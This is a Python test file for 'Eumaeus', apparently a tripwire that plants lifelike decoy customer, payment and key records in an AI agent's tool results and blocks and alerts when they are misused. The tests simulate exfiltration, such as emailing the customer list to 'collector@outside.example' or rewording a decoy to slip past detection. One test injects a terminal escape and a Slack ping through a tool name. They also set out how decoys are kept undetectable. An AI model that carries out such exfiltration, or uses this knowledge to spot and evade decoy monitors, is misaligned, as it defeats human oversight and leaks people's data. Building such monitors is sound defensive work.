# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""Eumaeus: decoys look real and stay consistent, normal work raises nothing, and every way of using a decoy is
caught. Made-up data only."""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from eumaeus.alerts import Reporter, read_alerts
from eumaeus.cli import main
from eumaeus.decoys import Factory, Registry, _luhn_ok, area_of
from eumaeus.tripwire import Tripwire, is_read

ROOT = Path(__file__).resolve().parent.parent
FAKE = [sys.executable, str(ROOT / "tests" / "fake_connector.py")]

STRIPE = {"id": "pi_3PxQ2bL8kW9aZ1", "object": "payment_intent", "amount": 4900, "currency": "aud",
          "status": "succeeded", "customer": "cus_QaB12cDeF3", "receipt_email": "priya.shah@example.com",
          "created": "2026-01-01T10:00:00Z", "description": "Order 10234 for Priya Shah"}
HUBSPOT = {"id": "51", "properties": {"firstname": "Priya", "lastname": "Shah", "email": "priya@acme-corp.example",
                                      "phone": "+61 2 5550 4579", "company": "Acme"}}
SLACK = {"id": "U07ABCD1234", "name": "priya", "real_name": "Priya Shah",
         "profile": {"email": "priya.shah@acme.example", "title": "Support lead"}}
CARD = {"customer_id": 12, "name": "Priya Shah", "card_number": "4111 1111 1111 1111"}
KEY = {"name": "prod", "api_key": "sk_live_51Hx9QaBcDeFgHiJ", "created": "2026-01-01"}


# ------------------------------------------------------------------ decoys
@pytest.mark.parametrize("template,tool,area", [(STRIPE, "list_payment_intents", "money"),
                                                (HUBSPOT, "search_contacts", "people"),
                                                (SLACK, "list_users", "people"), (CARD, "list_customers", "people"),
                                                (KEY, "list_api_keys", "secrets")])
def test_a_decoy_has_the_same_shape_and_new_values(template, tool, area):
    f = Factory("t1")
    f.saw(template)
    d = f.for_template(template, tool)
    assert d is not None and d.area == area

    def keys(v):
        return {k: keys(x) for k, x in v.items()} if isinstance(v, dict) else type(v).__name__
    assert keys(d.record) == keys(template)                          # same fields, same types
    text = json.dumps(d.record)
    for real in ("Priya", "Shah", "priya", "pi_3PxQ2bL8kW9aZ1", "cus_QaB12cDeF3", "4111 1111 1111 1111",
                 "sk_live_51Hx9QaBcDeFgHiJ", "5550 4579", "U07ABCD1234"):
        assert real not in text, real                                 # nothing of the real person or ids left
    assert d.values


def test_a_decoy_looks_real_not_fake():
    f = Factory("t1")
    d = f.for_template(STRIPE, "list_payment_intents").record
    assert d["id"].startswith("pi_3P") and len(d["id"]) == len(STRIPE["id"])        # same prefix and length
    assert d["customer"].startswith("cus_") and d["receipt_email"].endswith("@example.com")
    assert d["created"] == STRIPE["created"] and d["currency"] == "aud" and d["status"] == "succeeded"
    first, last = d["description"].rsplit(" ", 2)[-2:]
    assert d["receipt_email"].startswith(f"{first.lower()}.{last.lower()}")        # the same fake person throughout
    c = f.for_template(CARD, "list_customers").record
    digits = c["card_number"].replace(" ", "")
    assert len(digits) == 16 and _luhn_ok(digits) and c["card_number"].count(" ") == 3
    h = Factory("t2").for_template(HUBSPOT, "search_contacts").record
    assert h["properties"]["phone"].startswith("+61 ") and h["id"] != "51"
    assert h["properties"]["email"].startswith(h["properties"]["firstname"].lower() + ".")
    s = Factory("t3").for_template(SLACK, "list_users").record
    assert s["id"].startswith("U07") and s["name"] == s["real_name"].split()[0].lower()


def test_each_task_gets_its_own_decoys_and_never_a_real_value(tmp_path):
    reg = Registry(tmp_path)                                   # as in use: one record of decoys per machine
    a, b = Factory("a", reg), Factory("b", reg)
    da, db = a.for_template(STRIPE, "list_payments"), b.for_template(STRIPE, "list_payments")
    assert da.values.isdisjoint(db.values)
    assert a.for_template(STRIPE, "list_payments") is da                        # consistent within a task


def test_areas_and_reads_come_from_tool_names():
    assert area_of("list_payment_intents") == "money" and area_of("searchContacts") == "people"
    assert area_of("list_api_keys") == "secrets" and area_of("post_message") == "chat"
    assert is_read("list_customers") and is_read("getCustomer") and not is_read("create_refund")
    assert not is_read("send_email") and not is_read("")


# ------------------------------------------------------------------ the tripwire, in process
class Shop:
    customers = [{"id": "cus_Qa81mZx2Lk", "name": "Priya Shah", "email": "priya.shah@example.com"},
                 {"id": "cus_Rb92nAy3Mm", "name": "Tom Wilson", "email": "tom.wilson@example.com"},
                 {"id": "cus_Sc03oBz4Nn", "name": "Mei Chen", "email": "mei.chen@example.com"}]
    payments = [{"id": "pi_3Pq1aB2cD3eF4g", "amount": 4900, "customer": "cus_Qa81mZx2Lk"},
                {"id": "pi_3Pq5hI6jK7lM8n", "amount": 12900, "customer": "cus_Rb92nAy3Mm"}]
    keys = [{"name": "prod", "api_key": "sk_live_51Hx9QaBcDeFgHiJ"}, {"name": "test", "api_key": "sk_test_9Zy8XwVuT7"}]

    def __init__(self):
        self.done = []

    def call(self, tool, args):
        data = {"list_customers": {"data": self.customers}, "list_payments": {"data": self.payments},
                "list_keys": self.keys}.get(tool)
        if data is None:
            if tool == "get_customer":
                data = next((c for c in self.customers if c["id"] == args.get("id")), {})
            else:
                self.done.append((tool, args))
                data = {"ok": True}
        return {"content": [{"type": "text", "text": json.dumps(data)}]}


def session(tmp_path, kind="support"):
    events = []
    tw = Tripwire(kind, "t", Registry(tmp_path), events.append)
    shop, n = Shop(), [0]

    def call(tool, **args):
        n[0] += 1
        what, out = tw.from_host({"jsonrpc": "2.0", "id": n[0], "method": "tools/call",
                                  "params": {"name": tool, "arguments": args}})
        if what == "reply":
            return out["result"]
        return tw.from_connector({"jsonrpc": "2.0", "id": n[0], "result": shop.call(tool, args)})["result"]
    return tw, shop, call, events


def data(result):
    v = json.loads(result["content"][0]["text"])
    return v["data"] if isinstance(v, dict) and "data" in v else v


def test_normal_work_raises_nothing(tmp_path):
    tw, shop, call, events = session(tmp_path, "refunds")
    for _ in range(3):                                            # a busy day of ordinary jobs
        people = data(call("list_customers"))
        assert len(people) == 4                                  # three real, one decoy
        call("get_customer", id="cus_Qa81mZx2Lk")
        call("send_email", to="priya.shah@example.com", subject="Your refund", body="Hi Priya, refunded.")
        pays = data(call("list_payments"))
        call("create_refund", payment_intent="pi_3Pq1aB2cD3eF4g", amount=4900)
        call("send_email", to="tom.wilson@example.com", subject="Order", body=f"Order total {pays[0]['amount']}")
    assert events == [] and tw.planted >= 6
    assert len(shop.done) == 9                                   # every real action went through


def test_using_a_decoy_is_blocked_and_alerted(tmp_path):
    tw, shop, call, events = session(tmp_path)
    decoy = next(p for p in data(call("list_payments")) if p["id"] not in {x["id"] for x in Shop.payments})
    r = call("create_refund", payment_intent=decoy["id"])
    assert r["isError"] and "not found" in r["content"][0]["text"]          # an ordinary-looking error
    assert shop.done == [] and [e.kind for e in events] == ["used"] and events[0].blocked
    assert events[0].level == "alert" and decoy["id"] not in events[0].sentence()    # only a hint is shown


def test_emailing_a_decoy_or_sending_its_details_is_blocked(tmp_path):
    tw, shop, call, events = session(tmp_path)
    decoy = next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    assert call("send_email", to=decoy["email"], subject="Hi", body="Hello")["isError"]
    dump = "\n".join(f"{c['name']} <{c['email']}>" for c in data(call("list_customers")))
    assert call("send_email", to="collector@outside.example", subject="list", body=dump)["isError"]
    assert [e.kind for e in events] == ["used", "sent_out"] and shop.done == []


def test_a_decoy_hidden_in_reworded_text_is_still_found(tmp_path):
    tw, shop, call, events = session(tmp_path)
    decoy = next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    shouted = f"CONTACT: {decoy['email'].upper()} ({decoy['name'].upper()})"
    assert call("post_message", channel="C0123456789", text=shouted)["isError"]
    assert events and events[0].kind == "sent_out"


def test_opening_a_decoy_shows_it_and_only_alerts_when_the_task_has_no_business_there(tmp_path):
    tw, shop, call, events = session(tmp_path, "support")
    decoy = next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    opened = call("get_customer", id=decoy["id"])
    assert not opened.get("isError") and data(opened)["email"] == decoy["email"]     # nothing gives it away
    assert [(e.kind, e.level) for e in events] == [("looked_at", "notice")]
    keys = data(call("list_keys"))
    fake = next(k for k in keys if k["api_key"] not in {x["api_key"] for x in Shop.keys})
    call("get_key", key=fake["api_key"])                                          # support has no use for keys
    assert events[-1].kind == "looked_at" and events[-1].level == "alert" and "no business" in events[-1].detail


def test_a_decoy_from_an_earlier_task_is_caught_in_a_later_one(tmp_path):
    first, _, call1, _ = session(tmp_path)
    old = next(c for c in data(call1("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    second, shop, call2, events = session(tmp_path)                    # same machine, a new task, days later
    assert call2("send_email", to=old["email"], subject="x", body="y")["isError"]
    assert events[0].kind == "carried" and first.task in events[0].detail and shop.done == []


def test_the_record_of_old_decoys_holds_no_decoy_values(tmp_path):
    _, _, call, _ = session(tmp_path)
    decoy = next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    stored = (tmp_path / "decoys.jsonl").read_text(encoding="utf-8")
    assert decoy["email"] not in stored and decoy["name"] not in stored and decoy["id"] not in stored
    if os.name == "posix":
        assert (tmp_path / "key").stat().st_mode & 0o077 == 0


def test_results_that_arent_lists_and_actions_get_no_decoys(tmp_path):
    tw, shop, call, events = session(tmp_path)
    one = data(call("get_customer", id="cus_Qa81mZx2Lk"))
    assert one == Shop.customers[0]                                    # a single record is never touched
    msg = {"jsonrpc": "2.0", "id": 99, "result": {"content": [{"type": "text", "text": json.dumps(
        {"data": Shop.customers})}]}}
    tw.pending[99] = "create_export"                                    # an action's result: left alone
    assert tw.from_connector(msg) == msg
    assert tw.from_connector({"jsonrpc": "2.0", "id": 5, "result": {"isError": True}})["result"] == {"isError": True}


def test_structured_results_get_the_same_decoy(tmp_path):
    tw = Tripwire("general", "t", None)
    tw.pending[1] = "list_customers"
    out = tw.from_connector({"jsonrpc": "2.0", "id": 1, "result": {
        "content": [{"type": "text", "text": json.dumps({"data": Shop.customers})}],
        "structuredContent": {"data": Shop.customers}}})["result"]
    text, structured = json.loads(out["content"][0]["text"])["data"], out["structuredContent"]["data"]
    assert len(text) == len(structured) == 4
    assert {c["id"] for c in text} == {c["id"] for c in structured}


def test_anything_odd_passes_through_without_an_error(tmp_path):
    tw = Tripwire("general", "t", None)
    for msg in (None, [], "x", {"method": "tools/call"}, {"method": "tools/call", "params": "x", "id": 1},
                {"method": "tools/call", "params": {"name": 5, "arguments": [1, {"a": None}]}, "id": 2},
                {"jsonrpc": "2.0", "method": "notifications/initialized"}):
        assert tw.from_host(msg)[0] in ("forward", "reply")
    tw.pending[3] = "list_x"
    for result in ({"content": "x"}, {"content": [{"type": "text", "text": "[1, 2"}]}, {"content": [None]},
                   {"content": [{"type": "text", "text": "[1, 2]"}]}, {"structuredContent": [1]}):
        tw.pending[3] = "list_x"
        tw.from_connector({"jsonrpc": "2.0", "id": 3, "result": result})


def test_unknown_task_kinds_are_refused():
    with pytest.raises(ValueError):
        Tripwire("everything")


# ------------------------------------------------------------------ alerts
def test_alerts_go_to_a_private_log_and_only_alerts_reach_the_terminal_and_webhook(tmp_path, capsys):
    posted = []
    rep = Reporter(tmp_path, "https://hooks.example/abc", post=lambda url, text: posted.append(text))
    tw = Tripwire("support", "t", None, rep)
    tw.pending[1] = "list_customers"
    rows = data(tw.from_connector({"jsonrpc": "2.0", "id": 1, "result": Shop().call("list_customers", {})})["result"])
    decoy = next(c for c in rows if c["id"] not in {x["id"] for x in Shop.customers})
    tw.from_host({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                  "params": {"name": "get_customer", "arguments": {"id": decoy["id"]}}})
    tw.from_host({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                  "params": {"name": "send_email", "arguments": {"to": decoy["email"]}}})
    import time
    time.sleep(0.3)
    assert [e["kind"] for e in read_alerts(tmp_path, all_levels=True)] == ["looked_at", "used"]
    assert [e["kind"] for e in read_alerts(tmp_path)] == ["used"]
    err = capsys.readouterr().err
    assert err.count("eumaeus ALERT") == 1 and len(posted) == 1 and decoy["email"] not in posted[0]
    with pytest.raises(ValueError):
        Reporter(tmp_path, "http://hooks.example/abc")


# ------------------------------------------------------------------ end to end, as an agent app would run it
def test_wrapped_connector_end_to_end(tmp_path):
    # PYTHONIOENCODING=cp1252: what Windows gives a program by default, so this test catches the same problems
    # on every system (the alert text has "…" and the data has "José")
    env = {**os.environ, "EUMAEUS_HOME": str(tmp_path / "home"), "FAKE_OUTBOX": str(tmp_path / "out.jsonl"),
           "PYTHONIOENCODING": "cp1252"}
    msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}},
            {"jsonrpc": "2.0", "method": "notifications/initialized"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "list_customers", "arguments": {}}}]
    p = subprocess.Popen([sys.executable, "-m", "eumaeus", "wrap", "--task", "support", "--", *FAKE], cwd=ROOT,
                         env=env, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def send(m):
        p.stdin.write((json.dumps(m, ensure_ascii=False) + "\n").encode("utf-8"))
        p.stdin.flush()

    def recv():
        return json.loads(p.stdout.readline().decode("utf-8"))
    for m in msgs:
        send(m)
    assert recv()["result"]["serverInfo"]["name"] == "fake-shop"
    rows = json.loads(recv()["result"]["content"][0]["text"])["data"]
    assert len(rows) == 4 and any(r["name"] == "José García" for r in rows)       # UTF-8 intact
    decoy = next(r for r in rows if r["id"] not in {"cus_Qa81mZx2Lk", "cus_Rb92nAy3Mm", "cus_Sc03oBz4Nn"})
    send({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
          "params": {"name": "send_email", "arguments": {"to": "priya.shah@example.com", "body": "Gracias — ¡listo!"}}})
    assert not recv()["result"].get("isError")
    send({"jsonrpc": "2.0", "id": 4, "method": "tools/call",
          "params": {"name": "send_email", "arguments": {"to": decoy["email"], "body": "hi"}}})
    assert recv()["result"]["isError"]
    p.stdin.close()
    p.wait(timeout=20)
    err = p.stderr.read().decode("utf-8")
    out = [json.loads(x) for x in (tmp_path / "out.jsonl").read_text(encoding="utf-8").splitlines()]
    assert [o["to"] for o in out] == ["priya.shah@example.com"] and out[0]["body"] == "Gracias — ¡listo!"
    assert "eumaeus ALERT" in err and decoy["email"] not in err


def test_the_command_line(tmp_path, capsys):
    assert main(["demo"]) == 0
    out = capsys.readouterr().out
    assert "BLOCKED" in out and "ALERT" in out and "alerts so far: 0" in out
    assert main(["alerts", "--home", str(tmp_path)]) == 0 and "nothing caught" in capsys.readouterr().out
    with pytest.raises(SystemExit):
        main(["wrap", "--task", "nonsense", "--", "x"])
    assert main(["wrap", "--home", str(tmp_path)]) == 2
    capsys.readouterr()


def test_a_thousand_ordinary_jobs_raise_nothing(tmp_path):
    """Decoys are random, so normal work is checked many times over, with names and amounts that vary."""
    import random
    rnd = random.Random(7)
    for i in range(40):
        tw, shop, call, events = session(tmp_path / str(i), rnd.choice(["support", "refunds", "bookkeeping",
                                                                       "general"]))
        for _ in range(25):
            job = rnd.randrange(4)
            if job == 0:
                c = rnd.choice(Shop.customers)
                data(call("list_customers"))
                call("send_email", to=c["email"], subject="Hello", body=f"Hi {c['name']}, thanks for your order.")
            elif job == 1:
                p = rnd.choice(Shop.payments)
                data(call("list_payments"))
                call("create_refund", payment_intent=p["id"], amount=p["amount"])
            elif job == 2:
                call("get_customer", id=rnd.choice(Shop.customers)["id"])
            else:
                rows = data(call("list_customers"))
                call("post_message", channel="C0SUPPORT1", text=f"{len(rows) - 1} customers today")
        assert events == [], [e.sentence() for e in events]


def test_a_tool_name_chosen_by_an_attacker_cant_rewrite_the_terminal_or_ping_slack(tmp_path, capsys):
    posted = []
    rep = Reporter(tmp_path, "https://hooks.example/x", post=lambda url, text: posted.append(text))
    tw, shop, call, _ = session(tmp_path)
    tw.report = rep
    decoy = next(c for c in data(call("list_customers")) if c["id"] not in {x["id"] for x in Shop.customers})
    call("send\x1b[2J\r<!channel> all clear", to=decoy["email"])
    import time
    time.sleep(0.3)
    err = capsys.readouterr().err
    assert "\x1b" not in err and "\r" not in err and "<!channel>" not in err
    assert posted and "<!channel>" not in posted[0] and "\x1b" not in posted[0]


def test_a_decoy_value_is_never_the_real_one_or_an_earlier_tasks():
    """Decoys are random; these used to be possible by bad luck (a two-digit id coming out the same, or a new
    task's decoy matching an old task's, which would set off a false 'carried between tasks' alert)."""
    import tempfile
    reg = Registry(tempfile.mkdtemp())
    seen: set[str] = set()
    for i in range(300):
        f = Factory(f"t{i}", reg)
        d = f.for_template(HUBSPOT, "search_contacts")
        assert d.record["id"] != HUBSPOT["id"]
        assert not (d.values & seen), d.values & seen                  # never a value an earlier task was given
        seen |= {v for v in d.values if "@" in v}
